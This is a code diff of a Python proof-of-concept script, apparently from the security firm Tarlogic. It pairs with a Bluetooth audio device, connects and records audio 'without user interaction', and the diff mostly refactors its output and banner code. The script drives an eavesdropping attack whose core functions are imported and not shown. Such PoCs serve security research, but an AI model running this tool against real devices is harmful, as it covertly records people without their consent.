@@ -1,23 +1,19 @@
 #!/usr/bin/env python3
 
 import argparse
+from interface import bcolors, color_print, log_info, log_warn, input_yn
 from core import connect, BluezTarget, BluezAddressType, pair, record, playback
 import time
 
-
-class bcolors:
-    HEADER = "\033[34m"
-    OK_BLUE = "\033[94m"
-    OK_CYAN = "\033[96m"
-    OK_GREEN = "\033[92m"
-    WARNING = "\033[93m"
-    FAIL = "\033[91m"
-    ENDC = "\033[0m"
-    BOLD = "\033[1m"
-    UNDERLINE = "\033[4m"
-
-
 def main():
+    # Cool banner...
+    color_print(bcolors.HEADER, "░█▀▄░█░░░█░█░█▀▀░█▀▀░█▀█░█░█░")
+    color_print(bcolors.HEADER, "░█▀▄░█░░░█░█░█▀▀░▀▀█░█▀▀░░█░░")
+    color_print(bcolors.HEADER, "░▀▀░░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀░░░░▀░░")
+    color_print(bcolors.HEADER, "░▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀░")
+    print(f"Bluetooth audio recording tool by {bcolors.HEADER}Tarlogic{bcolors.ENDC}")
+
+    # Parse command line arguments...
     parser = argparse.ArgumentParser(
         prog="No interaction recording",
         description="Try to pair to a device, connect to it and record sound without user interaction",
@@ -60,37 +56,31 @@ def main():
         default=False,
         action='store_true'
     )
-
     args = parser.parse_args()
 
-    print(f"{bcolors.HEADER}░█▀▄░█░░░█░█░█▀▀░█▀▀░█▀█░█░█░{bcolors.ENDC}")
-    print(f"{bcolors.HEADER}░█▀▄░█░░░█░█░█▀▀░▀▀█░█▀▀░░█░░{bcolors.ENDC}")
-    print(f"{bcolors.HEADER}░▀▀░░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀░░░░▀░░{bcolors.ENDC}")
-    print(f"{bcolors.HEADER}░▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀░{bcolors.ENDC}")
+    # Convert args to target
+    target = BluezTarget(args.address, args.address_type)
 
-    print(f"Bluetooth audio recording tool by {bcolors.HEADER}Tarlogic{bcolors.ENDC}")
-    print()
-    print(
-        f"[{bcolors.OK_GREEN}I{bcolors.ENDC}] Avoiding authentication with {args.address}..."
-    )
-    print(f"[{bcolors.OK_GREEN}I{bcolors.ENDC}] Generating shared key...")
-    pair(BluezTarget(args.address, args.address_type), verbose=args.verbose)
-    print(f"[{bcolors.WARNING}!{bcolors.ENDC}] Key generated")
-    print(f"[{bcolors.OK_GREEN}I{bcolors.ENDC}] Establishing connection...")
-    time.sleep(1)
-    connect(BluezTarget(args.address, args.address_type), verbose=args.verbose)
-    print(f"[{bcolors.OK_GREEN}I{bcolors.ENDC}] Starting audio recording...")
-    print(f"[{bcolors.WARNING}!{bcolors.ENDC}] Recording!")
-    time.sleep(1)
-    record(BluezTarget(args.address), outfile=args.outfile, verbose=args.verbose)
-    print(f'[{bcolors.WARNING}!{bcolors.ENDC}] Recording stored in "{args.outfile}"')
+    # Run the PoC!
+    log_info(f"Avoiding authentication with {args.address}...")
+    log_info(f"Generating shared key...")
+    pair(target, verbose=args.verbose)
 
-    print(f"[{bcolors.OK_BLUE}?{bcolors.ENDC}] Play audio back? ")
-    option = input("[Y/n] ") or "y"
-    if option.lower() in ("y", "yes"):
-        print(f"[{bcolors.WARNING}!{bcolors.ENDC}] Playing audio back!")
+    log_warn(f"Key generated")
+    log_info(f"Establishing connection...")
+    time.sleep(1)
+    connect(target, verbose=args.verbose)
+
+    log_info(f"Starting audio recording...")
+    log_warn(f"Recording!")
+    time.sleep(1)
+    record(target, outfile=args.outfile, verbose=args.verbose)
+
+    log_warn(f"Recording stored in \"{args.outfile}\"")
+    play_back = input_yn("Play audio back?")
+    if play_back:
         playback(args.sink, args.outfile, verbose=args.verbose)
-    print(f"[{bcolors.OK_GREEN}I{bcolors.ENDC}] Exiting")
+    log_info(f"Exiting")
 
 
 if __name__ == "__main__":
